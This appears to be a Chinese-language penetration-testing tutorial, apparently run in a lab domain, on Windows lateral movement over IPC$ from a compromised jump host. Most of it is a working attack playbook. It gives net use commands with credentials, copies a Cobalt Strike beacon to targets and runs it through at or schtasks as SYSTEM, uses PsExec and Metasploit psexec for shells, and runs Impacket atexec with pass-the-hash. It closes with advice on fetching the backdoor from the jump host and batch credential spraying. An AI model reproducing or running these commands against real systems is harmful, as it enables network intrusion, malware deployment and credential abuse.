目的：借助已上线的跳板机，利用IPC对内网主机上传后门文件，并创建定时任务运行后门，实现借助跳板机内网主机上线。
利用条件：需要有内网主机账号密码或域用户及密码 或hash。使用 139、445 端口。
```
域用户账号
god.org\administrator
god\administrator

本地账号
.\administrator
```

## **IPC介绍**
* IPC（Internet Process Connection）指进程间通信开放的命名管道，进行进程通信。
* IPC可以通过验证用户名和密码获得相应权限，比如远程管理计算机和查看共享资源
* 通过ipc$，可以与目标机器建立连接，利用这个连接，可以访问目标机器的文件、上传、下载以及运行命令定时任务等
* IPC 是专用管道，可以实现对远程计算机的访问，

## **利用方法**
此时在webserver的192.168.3.31,作为跳板机
```
ipc建立隧道
• 建立ipc$: net use \\192.168.11.12\ipc$ /user:administrator admin@123
• 查看建立的连接：net use
• 访问远程文件：dir \\192.168.11.12\c$

用smb拿到反弹shell    
使用PsTools中的PsExec.exe.
    PsExec.exe \\192.168.11.11 -s cmd.exe
Metesploit中的psexec模块
    选择模块：use exploit/windows/smb/psexec
```
流程：
1. 建立 IPC 链接到目标主机
2. 拷贝要执行的命令脚本到目标主机
3. 查看目标时间，创建计划任务（at、schtasks）定时执行拷贝到的脚本
4. 删除 IPC 链接


![image-20240412142237629](http://cdn.33129999.xyz/mk_img/image-20240412142237629.png)
### **使用IPC命令**
此时在webserver的192.168.3.31
CS生成后门用正向后门，或代理转发-转发上线 用反向后门。
CS中命令要在前面加shell
```
1、目标机 < Windows2012 用at定时任务
net use \\192.168.3.21\ipc$  "Admin12345"  /user:god.org\administrator
ministrator # 建立 ipc 连接：
copy beacon.exe \\192.168.3.21\c$ #拷贝后门文件到目标机器

at \\192.168.3.21 15:47 c:\beacon.exe #添加计划任务

2、目标机>=Windows2012 用schtasks定时任务
net use \\192.168.3.32\ipc$ "admin!@#45" /user:god.org\dbadmin
ministrator # 建立 ipc 连接：
copy beacon.exe \\192.168.3.32\c$ #复制文件到其 C 盘

schtasks /create /s 192.168.3.32 /ru "SYSTEM" /tn beacon /sc 
DAILY /tr c:\beacon.exe /F          #创beacon任务对应执行文件
schtasks /run /s 192.168.3.32 /tn beacon /i      #运行 beacon 任务
schtasks /delete /s 192.168.3.22 /tn beacon /f    #删除 beacon 任务
```
运行后门后即可新上线。

^
### **使用CS的IPC**
 LSTAR插件-横向移动-IPC 连接

^
### **使用Impacket的atexec程序脚本 支持hash**
**域横向移动-IPC-套件版-Impacket-atexec**
该工具是一个半交互的工具，适用于webshell下，Socks代理下；
在渗透利用中可以收集用户名、明文密码、密码hash、远程主机等做成字典，批量测试

1、.py版：https://github.com/SecureAuthCorp/impacket
```
python atexec.py god/administrator:Admin12345@192.168.3.21 "ver" 
python atexec.py -hashes :ccef208c6485269c20db2cad21734fe7 ./administrator@192.168.3.21 "whoami"
```
2、.exe版(内存有点大，5m):  https://gitee.com/RichChigga/impacket-examples-windows
```
cs本地用户明文连接：
shell atexec.exe./administrator:Admin12345@192.168.3.21 "whoami"
cs域内用户明文连接：
shell atexec.exe god/administrator:Admin12345@192.168.3.21 "ver"
cs域内本地用户明文密文连接：
shell atexec.exe -hashes :ccef208c6485269c20db2cad21734fe7 ./administrator@192.168.3.21 "whoami"

shell atexec.exe -hashes :ccef208c6485269c20db2cad21734fe7 god/administrator@192.168.3.21 "whoami"
```
将后门beacon.exe上传到跳板机80端口根目录。
把命令改成 下载跳板机:80上的后门命令，再直接运行即可。

^
**域横向移动-IPC-Socks代理后使用atexec**
exe文件要上传到跳板机上，文件过大上传不稳定容易损坏，动静过大。
将跳板机在CS一键Socks代理，在本地配置代理ip 如用profier代理转发，本地运行python脚本或程序 指向内网ip。

可以写一个脚本，把内网ip，已有的用户名，明文密码，密码hash导入，批量反向上线。
实现喷洒。